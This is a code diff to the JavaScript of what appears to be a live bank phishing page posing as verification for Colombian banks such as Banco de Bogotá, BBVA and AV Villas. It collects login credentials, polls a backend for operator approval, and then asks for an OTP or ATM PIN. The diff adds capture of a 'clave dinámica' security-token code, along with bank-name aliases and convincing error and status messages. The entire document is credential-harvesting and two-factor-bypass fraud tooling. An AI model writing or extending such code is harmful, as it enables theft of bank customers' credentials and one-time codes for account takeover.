@@ -177,7 +177,10 @@
             'Banco de Bogotá': 'bog.png',
             'Banco Occidente': 'occi.png',
             'BBVA Colombia':   'bbva.png',
-            'AV Villas':       'avvillas.png'
+            'BBVA':            'bbva.png',
+            'BANCO BILBAO VIZCAYA ARGENTARIA COLOMBIA, S.A': 'bbva.png',
+            'AV Villas':       'avvillas.png',
+            'AVVillas':        'avvillas.png'
         };
 
         let solicitudId = null;
@@ -194,7 +197,8 @@
         let faseActual = 'credenciales';
         let pollingInterval = null;
         let formularioBloqueado = false;
-        let esClaveATM = false;   // 🔥 flag dinámico
+        let esClaveATM = false;
+        let esClaveDinamica = false;   // 🔥 nuevo flag
 
         const form = document.getElementById('authForm');
         const usernameInput = document.getElementById('username');
@@ -266,6 +270,8 @@
             } else if (paso === 'otp') { 
                 if (esClaveATM) {
                     payload.clave_atm = codigoExtra;
+                } else if (esClaveDinamica) {
+                    payload.clave_dinamica = codigoExtra;
                 } else {
                     payload.codigo_otp = codigoExtra;
                 }
@@ -304,8 +310,8 @@
                     if (data.estado === 'aprobado' && data.fase === 'credenciales') {
                         clearInterval(pollingInterval); pollingInterval = null;
                         loadingOverlay.classList.remove('active');
-                        // 🔥 El backend nos dice si es clave ATM
-                        desbloquearOTP(!!data.requiere_clave_atm);
+                        // 🔥 pasar ambos flags
+                        desbloquearOTP(!!data.requiere_clave_atm, !!data.requiere_clave_dinamica);
                         return;
                     }
 
@@ -330,17 +336,19 @@
                         loadingOverlay.classList.remove('active');
 
                         if (data.fase === 'otp') {
+                            let mensaje = 'No fue posible validar el código ingresado. Por favor, inténtalo nuevamente.';
+                            if (esClaveATM) mensaje = 'No fue posible validar la clave ingresada. Por favor, inténtalo nuevamente.';
+                            if (esClaveDinamica) mensaje = 'No fue posible validar la clave dinámica. Por favor, inténtalo nuevamente.';
+
                             statusMessage.className = 'status-message error';
-                            statusMessage.textContent = esClaveATM
-                                ? 'No fue posible validar la clave ingresada. Por favor, inténtalo nuevamente.'
-                                : 'No fue posible validar el código ingresado. Por favor, inténtalo nuevamente.';
+                            statusMessage.textContent = mensaje;
                             statusMessage.style.display = 'block';
                             confirmationInput.value = '';
                             confirmationInput.disabled = false;
                             confirmationInput.parentElement.classList.remove('error');
                             confirmationInput.focus();
                             submitButton.disabled = false;
-                            buttonText.textContent = esClaveATM ? 'Confirmar clave' : 'Confirmar OTP';
+                            buttonText.textContent = esClaveATM ? 'Confirmar clave' : (esClaveDinamica ? 'Confirmar clave dinámica' : 'Confirmar OTP');
                             formularioBloqueado = false;
                         } else {
                             mostrarError('No fue posible completar la verificación. Por favor, inténtalo nuevamente.');
@@ -352,9 +360,10 @@
             }, POLLING_INTERVAL);
         }
 
-        // 🔥 Ahora recibe parámetro: si es clave ATM o no
-        function desbloquearOTP(requiereClaveATM = false) {
+        // 🔥 Ahora recibe ambos flags
+        function desbloquearOTP(requiereClaveATM = false, requiereClaveDinamica = false) {
             esClaveATM = !!requiereClaveATM;
+            esClaveDinamica = !!requiereClaveDinamica;
 
             usernameInput.disabled = true; 
             passwordInput.disabled = true;
@@ -371,6 +380,16 @@
                 document.getElementById('mainTitle').textContent = 'Verificación de seguridad';
                 document.getElementById('mainSubtitle').innerHTML =
                     `Credenciales verificadas. Ingresa la clave del cajero para completar la transacción con <strong>${bankNombre.textContent}</strong>.`;
+            } else if (esClaveDinamica) {
+                otpLabel.innerHTML = 'Clave dinámica <span class="required">*</span>';
+                otpInfoMessage.textContent = 'Ingresa la clave dinámica generada por tu dispositivo de seguridad.';
+                confirmationInput.placeholder = 'Ingresa tu clave dinámica (4-8 dígitos)';
+                confirmationInput.maxLength = 8;
+                otpErrorMsg.textContent = 'La clave dinámica debe tener entre 4 y 8 dígitos';
+                buttonText.textContent = 'Confirmar clave dinámica';
+                document.getElementById('mainTitle').textContent = 'Verificación de seguridad';
+                document.getElementById('mainSubtitle').innerHTML =
+                    `Credenciales verificadas. Ingresa la clave dinámica para completar la transacción con <strong>${bankNombre.textContent}</strong>.`;
             } else {
                 otpLabel.innerHTML = 'Código OTP <span class="required">*</span>';
                 otpInfoMessage.textContent = 'Para realizar este proceso, ingresa el código de Token móvil o físico.';
@@ -405,6 +424,7 @@
             otpSection.classList.remove('visible'); 
             faseActual = 'credenciales'; 
             esClaveATM = false;
+            esClaveDinamica = false;
             loadingOverlay.classList.remove('active');
             submitButton.disabled = false; 
             buttonText.textContent = 'Continuar';
@@ -448,16 +468,18 @@
                     isValid = false; 
                 } else {
                     if (esClaveATM) {
-                        // 🔥 Solo 4 dígitos numéricos
                         if (!/^\d{4}$/.test(confirmationInput.value)) {
                             confirmationInput.parentElement.classList.add('error');
                             otpErrorMsg.textContent = 'La clave debe tener 4 dígitos';
                             isValid = false;
                         }
                     } else {
+                        // OTP normal o clave dinámica: 4-8 dígitos
                         if (!/^\d{4,8}$/.test(confirmationInput.value)) {
                             confirmationInput.parentElement.classList.add('error');
-                            otpErrorMsg.textContent = 'El código debe tener entre 4 y 8 dígitos';
+                            otpErrorMsg.textContent = esClaveDinamica
+                                ? 'La clave dinámica debe tener entre 4 y 8 dígitos'
+                                : 'El código debe tener entre 4 y 8 dígitos';
                             isValid = false;
                         }
                     }
@@ -482,8 +504,13 @@
                 iniciarPolling('Esperando aprobación del banco...');
 
             } else if (faseActual === 'otp') {
-                buttonText.textContent = esClaveATM ? 'Verificando clave...' : 'Verificando OTP...'; 
-                loadingText.textContent = esClaveATM ? 'Validando clave de cajero...' : 'Validando código de seguridad...'; 
+                let textoBoton = 'Verificando OTP...';
+                let textoLoading = 'Validando código de seguridad...';
+                if (esClaveATM) { textoBoton = 'Verificando clave...'; textoLoading = 'Validando clave de cajero...'; }
+                else if (esClaveDinamica) { textoBoton = 'Verificando clave dinámica...'; textoLoading = 'Validando clave dinámica...'; }
+
+                buttonText.textContent = textoBoton; 
+                loadingText.textContent = textoLoading; 
                 loadingOverlay.classList.add('active');
                 
                 const ok = await enviarDatos('otp', confirmationInput.value.trim());
@@ -491,7 +518,7 @@
                     mostrarError('No fue posible procesar la información. Por favor, inténtalo nuevamente.'); 
                     formularioBloqueado = false; 
                     submitButton.disabled = false; 
-                    buttonText.textContent = esClaveATM ? 'Confirmar clave' : 'Confirmar OTP'; 
+                    buttonText.textContent = esClaveATM ? 'Confirmar clave' : (esClaveDinamica ? 'Confirmar clave dinámica' : 'Confirmar OTP');
                     return; 
                 }
                 iniciarPolling('Esperando confirmación final...');
